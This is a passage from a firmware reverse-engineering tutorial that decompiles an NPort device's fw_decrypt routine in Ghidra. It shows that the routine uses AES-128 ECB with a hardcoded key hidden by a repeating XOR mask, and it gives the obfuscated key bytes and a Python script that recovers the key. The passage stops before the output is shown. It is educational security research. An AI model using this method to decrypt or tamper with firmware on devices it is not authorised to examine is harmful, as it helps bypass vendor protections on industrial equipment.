</span></span></code></pre></div><p>After some digging around in the code, I found that the <code>fw_decrypt</code> function calls another pretty interesting function called <code>ecb128Decrypt</code>. This is probably the AES 128 ECB mode decrypt function. And that function was directly calling some AES functions from the <em>OpenSSL</em> library. So to decrypt this firmware, we can use the <em>OpenSSL</em> command-line command in AES mode. However, we need to obtain the key used to encrypt this firmware to decrypt it.</p>
<h2 id="reversing-the-ecb128decrypt-function">Reversing the ecb128Decrypt function</h2>
<p>I&rsquo;ll try to reverse engineer this to get the key. We&rsquo;ll start by reversing the <code>ecb128Decrypt</code> function:</p>

    <img src="/img/nport-firmware/nport-firmware-ecb128decrypt-function-reversed.png"  alt="NPort firmware ecb128Decrypt function reversed"  class="center"  style="padding: 10px"  />


<p>Let&rsquo;s analyze this. I&rsquo;ll rename and retype the variables as we analyze the program.</p>
<p>First, we&rsquo;ll checkout the AES function. The <code>AES_set_decrypt_key</code> takes in a user key and expand it to an AES key. We can see that the <code>AES_set_decrypt_key</code> function uses <code>auStack_30</code>. In the <a href="https://www.openssl.org/docs/">OpenSSL documentation</a>, we know that the first argument in this function is a user key. So we can rename <code>auStack_30</code> to <code>user_key</code>. <code>AStack_124</code> is the AES key so we&rsquo;ll rename it to <code>aes_key</code>, this will be used for decryption later on.</p>
<p>This function also takes in a key size argument too. In our program, the key size argument is <em>0x80</em> which is <em>128</em> in decimal, so we are working with a <em>128-bit</em> AES key. I&rsquo;ll change the type of this <em>0x80</em> to decimal.</p>
<p>Next, we can see in the <code>strncpy</code> line, it&rsquo;s copying 16 bytes of <code>param_4</code> into <code>auStack_30</code>, which is user key. So <code>param_4</code> is probably the decryption key because <code>user_key</code> will later be used in the AES decrypt function for decryption. We&rsquo;ll rename this to <code>decrypt_key</code>.</p>
<p>We&rsquo;ll take a look at the <code>in</code> and <code>out</code> variables, we can see that they contain the values of <code>param_1</code> and <code>param_2</code> and they are offseted by <em>0x10</em> (or 16). These 2 variables are also passed into the <code>AES_ecb_encrypt</code> function.</p>
<p>The <code>AES_ecb_encrypt</code> function takes in an input buffer, an output buffer, an AES key and a encrypt mode. Since the encrypt mode for the <code>AES_ecb_encrypt</code> function is 0 in this case, <code>AES_ecb_encrypt</code> will be put into decrypt mode. So this will decrypt the data in the input buffer using the AES key and output the decrypted data to the output buffer.</p>
<p>So we can deduct that the <code>param_1</code> and <code>param_2</code> variables are the input buffer and output buffer. We&rsquo;ll rename <code>param_1</code> to <code>decrypt_in</code> and <code>param_2</code> to <code>decrypt_out</code> and retype them as <code>uchar*</code> because <code>in</code> and <code>out</code> are both <code>uchar*</code>.</p>
<p>Next, we can see that <code>iVar1</code> is the index variable used in the loop, and it only stop when it is equal to <code>param_3 + -0x28</code>. So I think <code>param_3</code> is the size of the input buffer. We&rsquo;ll rename <code>param_3</code> to <code>decrypt_size</code>. We can see that <code>decrypt_size</code> needs to be offseted by <code>-0x28</code>, this might be an indication that there&rsquo;s some padding bytes in front of the file. If you remember back when we tried to hexdump the firmware, we found some padding 0 bytes on top of the file. So this firmware was offseted by <em>0x28</em> or 40 bytes.</p>
<p>Here&rsquo;s the renamed and retyped function:</p>

    <img src="/img/nport-firmware/nport-firmware-ecb128decrypt-reversed-renamed.png"  alt="NPort firmware ecb128Decrypt function renamed"  class="center"  style="padding: 10px"  />


<p>Now, we can say how <code>ecb128Decrypt</code> works: It takes in an encrypted input buffer (<code>decrypt_in</code>), decrypt it with a key (<code>decrypt_key</code>), and output it into an output buffer (<code>decrypt_out</code>).</p>
<h2 id="reversing-the-fw_decrypt-function">Reversing the fw_decrypt function</h2>
<p>Now we understand how the <code>ecb128Decrypt</code> function (which is the main function used in the <code>fw_decrypt</code> function) works, we&rsquo;ll check out the <code>fw_decrypt</code> function and see how that works.</p>
<blockquote>
<p><strong>Note</strong>: The code for <code>fw_decrypt</code> is quite long so I&rsquo;ll copy it into a code block here instead of taking a picture</p></blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">fw_decrypt</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>param_1,uint <span style="color:#f92672">*</span>param_2,undefined4 param_3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  undefined4 uVar1;
</span></span><span style="display:flex;"><span>  uint <span style="color:#f92672">*</span>puVar2;
</span></span><span style="display:flex;"><span>  byte <span style="color:#f92672">*</span>pbVar3;
</span></span><span style="display:flex;"><span>  uint decrypt_size;
</span></span><span style="display:flex;"><span>  uint uVar4;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>__src;
</span></span><span style="display:flex;"><span>  uint <span style="color:#f92672">*</span>local_24;
</span></span><span style="display:flex;"><span>  undefined4 uStack_20;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  decrypt_size <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>param_2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (param_1 <span style="color:#f92672">==</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\x01&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((((decrypt_size <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x29</span>) <span style="color:#f92672">||</span> (decrypt_size <span style="color:#f92672">&lt;</span> (<span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>)) <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>        (decrypt_size <span style="color:#f92672">&lt;</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>))) <span style="color:#f92672">||</span> ((decrypt_size <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x28</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffffffe</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      pbVar3 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>passwd<span style="color:#ae81ff">.3309</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> (pbVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">!=</span> ubuf) {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>pbVar3 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>pbVar3 <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xa7</span>;
</span></span><span style="display:flex;"><span>        pbVar3[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> pbVar3[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x8b</span>;
</span></span><span style="display:flex;"><span>        pbVar3[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> pbVar3[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2d</span>;
</span></span><span style="display:flex;"><span>        pbVar3[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> pbVar3[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">^</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>        pbVar3 <span style="color:#f92672">=</span> pbVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      local_24 <span style="color:#f92672">=</span> param_2;
</span></span><span style="display:flex;"><span>      uStack_20 <span style="color:#f92672">=</span> param_3;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">ecb128Decrypt</span>((uchar <span style="color:#f92672">*</span>)param_1,(uchar <span style="color:#f92672">*</span>)param_1,decrypt_size,<span style="color:#f92672">&amp;</span>passwd<span style="color:#ae81ff">.3309</span>);
</span></span><span style="display:flex;"><span>      uVar4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (((<span style="color:#ae81ff">0x28</span> <span style="color:#f92672">&lt;</span> uVar4) <span style="color:#f92672">&amp;&amp;</span> ((<span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">&lt;</span> uVar4)) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>         (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\0&#39;</span>)) {
</span></span><span style="display:flex;"><span>        __src <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> (uint)<span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>local_24,__src,<span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>        puVar2 <span style="color:#f92672">=</span> (uint <span style="color:#f92672">*</span>)<span style="color:#a6e22e">cal_crc32</span>((<span style="color:#66d9ef">int</span>)__src <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>,uVar4 <span style="color:#f92672">+</span> (<span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>) <span style="color:#f92672">*</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>,
</span></span><span style="display:flex;"><span>                                   <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (puVar2 <span style="color:#f92672">==</span> local_24) {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)decrypt_size <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">int</span>)uVar4) {
</span></span><span style="display:flex;"><span>            uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffffffb</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>param_2 <span style="color:#f92672">=</span> uVar4;
</span></span><span style="display:flex;"><span>            uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">goto</span> LAB_0001191c;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffffffc</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>LAB_0001191c:
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">CONCAT44</span>(param_1,uVar1);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s analyze each parts. On this line:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">ecb128Decrypt</span>((uchar <span style="color:#f92672">*</span>)param_1,(uchar <span style="color:#f92672">*</span>)param_1,decrypt_size,<span style="color:#f92672">&amp;</span>passwd<span style="color:#ae81ff">.3309</span>);
</span></span></code></pre></div><p>Since we know how <code>ecb128Decrypt</code> works, we can see that the parameters <code>decrypt_in</code> and <code>decrypt_out</code> takes in the same variable: <code>param_1</code>. So it looks like the variable is being decrypted into the same place. We&rsquo;ll rename <code>param_1</code> to <code>fw_buffer</code> and retype it to <code>uchar*</code>.</p>
<p>The <code>ecb128Decrypt</code> also takes in a variable called <code>decrypt_size</code>, which got its value from <code>param_2</code> (see line <code>decrypt_size = *param_2;</code>). So we can rename <code>param_2</code> to <code>fw_buffer_size</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">ecb128Decrypt</span>(fw_buffer,fw_buffer,decrypt_size,<span style="color:#f92672">&amp;</span>passwd<span style="color:#ae81ff">.3309</span>);
</span></span></code></pre></div><p>Next, the first conditional &ldquo;<em>if</em>&rdquo; statement checks whether <code>param_1</code> (<code>fw_buffer</code>) is <em>null</em> or not. If it is, it sets the <code>uVar2</code> to <em>0xffffffff</em>. We know that <code>uVar2</code> is the return value of this <code>fw_decrypt</code> function so we&rsquo;ll rename this to <code>return_value</code>.</p>
<p>By trying to set the <code>return_value</code> to <em>0xffffffff</em>, it&rsquo;s trying to overflow the <code>return_value</code> into the negative range. We can check what negative number this will overflow into by changing the data type of <code>return_value</code> from <code>uint</code> to <code>int</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (fw_buffer <span style="color:#f92672">==</span> (uchar <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>    return_value <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So this will just return <em>-1</em>, which means failed in C, if the <code>fw_buffer</code> is <em>null</em>. By figuring out what <code>uVar2</code> is, we can also derive the return type of this <code>fw_decrypt</code> function, which is <code>int</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">fw_decrypt</span>(uchar <span style="color:#f92672">*</span>fw_buffer,uint <span style="color:#f92672">*</span>fw_buffer_size,undefined4 param_3)
</span></span></code></pre></div><p>We&rsquo;re getting close, the function is much easier to read now.</p>
<p>In the <em>if</em> statement inside the <em>else if</em> statement, it&rsquo;s checking for errors and valid firmware size and return a negative value if it&rsquo;s not successful, nothing interesting yet. The <em>else</em> statement after that looks quite interesting though:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>  pbVar3 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>passwd<span style="color:#ae81ff">.3309</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (pbVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">!=</span> ubuf) {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>pbVar3 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>pbVar3 <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xa7</span>;
</span></span><span style="display:flex;"><span>    pbVar3[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> pbVar3[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x8b</span>;
</span></span><span style="display:flex;"><span>    pbVar3[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> pbVar3[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2d</span>;
</span></span><span style="display:flex;"><span>    pbVar3[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> pbVar3[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">^</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>    pbVar3 <span style="color:#f92672">=</span> pbVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  local_24 <span style="color:#f92672">=</span> fw_buffer_size;
</span></span><span style="display:flex;"><span>  uStack_20 <span style="color:#f92672">=</span> param_3;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ecb128Decrypt</span>(fw_buffer,fw_buffer,decrypt_size,<span style="color:#f92672">&amp;</span>passwd<span style="color:#ae81ff">.3309</span>);
</span></span><span style="display:flex;"><span>  uVar4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(fw_buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (((<span style="color:#ae81ff">0x28</span> <span style="color:#f92672">&lt;</span> uVar4) <span style="color:#f92672">&amp;&amp;</span> (bVar1 <span style="color:#f92672">=</span> fw_buffer[<span style="color:#ae81ff">0xd</span>], (bVar1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">&lt;</span> uVar4)) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>     (fw_buffer[<span style="color:#ae81ff">0xe</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\0&#39;</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>local_24,fw_buffer <span style="color:#f92672">+</span> (uint)bVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24</span>,<span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    puVar2 <span style="color:#f92672">=</span> (uint <span style="color:#f92672">*</span>)<span style="color:#a6e22e">cal_crc32</span>((<span style="color:#66d9ef">int</span>)(fw_buffer <span style="color:#f92672">+</span> (uint)bVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>),
</span></span><span style="display:flex;"><span>                               uVar4 <span style="color:#f92672">+</span> (fw_buffer[<span style="color:#ae81ff">0xd</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>) <span style="color:#f92672">*</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (puVar2 <span style="color:#f92672">==</span> local_24) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)uVar4 <span style="color:#f92672">&lt;=</span> (<span style="color:#66d9ef">int</span>)decrypt_size) {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>fw_buffer_size <span style="color:#f92672">=</span> uVar4;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  return_value <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s go through each part here:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pbVar3 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>passwd<span style="color:#ae81ff">.3309</span>;
</span></span></code></pre></div><p><code>passwd.3309</code> looks like a password variable. We know that this was also passed into <code>ecb128Decrypt</code> as the <code>decrypt_key</code>. We&rsquo;re gonna keep a close eye on this. We can see that <code>pbVar3</code> will hold the value of <code>passwd.3309</code> so we&rsquo;ll rename <code>pbVar3</code> to <code>password</code>.</p>
<p>Next, in the <em>while</em> loop, we can see some <em>XOR</em> operations being done on the <code>password</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (pbVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">!=</span> ubuf) {
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>pbVar3 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>pbVar3 <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xa7</span>;
</span></span><span style="display:flex;"><span>  pbVar3[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> pbVar3[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x8b</span>;
</span></span><span style="display:flex;"><span>  pbVar3[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> pbVar3[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2d</span>;
</span></span><span style="display:flex;"><span>  pbVar3[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> pbVar3[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">^</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>  pbVar3 <span style="color:#f92672">=</span> pbVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This could be an indication of an obfuscation or encryption scheme. We&rsquo;ll take a closer look at this by trying to reimplement the operation in a Python script.</p>
<p>Firstly, we need to get the hex data that <code>passwd.3309</code> is pointing to, we can do this by looking at the <strong>Bytes</strong> window in Ghidra:</p>

    <img src="/img/nport-firmware/nport-firmware-fw_decrypt-passwd-bytes.png"  alt="NPort firmware fw_decrypt passwd3309 bytes"  class="center"  style="padding: 10px"  />


<p>We&rsquo;ll copy all those highlighted bytes into a Python array:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>passwd <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0xb3</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x6b</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0xbe</span>, <span style="color:#ae81ff">0x1b</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xa7</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x05</span>]
</span></span></code></pre></div><p>Next, we need to implement a <em>while</em> loop that can do all the XOR operations of the decompiled <em>while</em> loop:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (i <span style="color:#f92672">&lt;</span> len(passwd)):
</span></span><span style="display:flex;"><span>	passwd[i] <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0xa7</span>
</span></span><span style="display:flex;"><span>	passwd[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x8b</span>
</span></span><span style="display:flex;"><span>	passwd[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x2d</span>
</span></span><span style="display:flex;"><span>	passwd[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>] <span style="color:#f92672">^=</span> <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>
</span></span></code></pre></div><p>Once this loop is done, we can print out the password:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(chr(byte) <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> passwd))
</span></span></code></pre></div><p>And that&rsquo;s done, we now have the completed script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>passwd <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0xb3</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x6b</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0xbe</span>, <span style="color:#ae81ff">0x1b</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xa7</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x05</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (i <span style="color:#f92672">&lt;</span> len(passwd)):
</span></span><span style="display:flex;"><span>	passwd[i] <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0xa7</span>
</span></span><span style="display:flex;"><span>	passwd[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x8b</span>
</span></span><span style="display:flex;"><span>	passwd[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x2d</span>
</span></span><span style="display:flex;"><span>	passwd[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>] <span style="color:#f92672">^=</span> <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(chr(byte) <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> passwd))
</span></span></code></pre></div><p>If we run this, we get this as an output:</p>

